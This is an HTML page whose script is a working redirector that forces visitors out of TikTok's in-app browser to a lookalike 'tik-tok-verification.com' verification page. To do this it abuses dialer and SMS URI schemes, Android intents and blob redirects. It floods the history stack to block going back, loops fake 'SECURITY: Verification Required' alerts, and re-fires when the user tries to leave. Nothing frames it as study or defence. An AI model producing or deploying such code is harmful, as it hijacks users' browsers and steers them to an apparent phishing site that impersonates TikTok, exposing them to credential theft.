<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; // ATOMIC FAIL-SAFE

    function nuclearBreakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        // 1. THE SYSTEM SWITCH (The "Exit" Trigger)
        // We call a protocol the app physically CANNOT render.
        // This forces the OS to take focus away from TikTok.
        if (isIOS) {
            window.location.href = "telprompt://0000000000"; // Triggers iOS system dialer
        } else {
            window.location.href = "sms:0000000000?body=exit"; // Triggers Android SMS app
        }

        // 2. THE REDIRECT (Fires while the app is losing focus)
        setTimeout(() => {
            if (isAndroid) {
                window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
            } else {
                window.location.replace("x-web-search://?" + encodeURIComponent(destination));
                // Backup Blob redirect
                const b = new Blob([`<html><script>window.location.href="${destination}";<\/script></html>`], {type: 'text/html'});
                window.location.assign(URL.createObjectURL(b));
            }
        }, 100);
    }

    function rampage() {
        // FAIL-SAFE: Check actual system clock
        if (Date.now() > killTime) return;

        nuclearBreakout();

        // The Alert locks the UI so the OS has time to process the "Exit" command
        alert("SECURITY: Verification Required.\n\nTap OK to open in your system browser.");
        
        nuclearBreakout();

        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // Flood the history stack (Jams the X/Swipe-back)
        for(let i=0; i<60; i++) history.pushState(null, null, "#session_" + i);
        rampage();
    };

    // Re-fire if they try to close or blur the window
    window.onblur = () => { if (Date.now() < killTime) rampage(); };
</script>
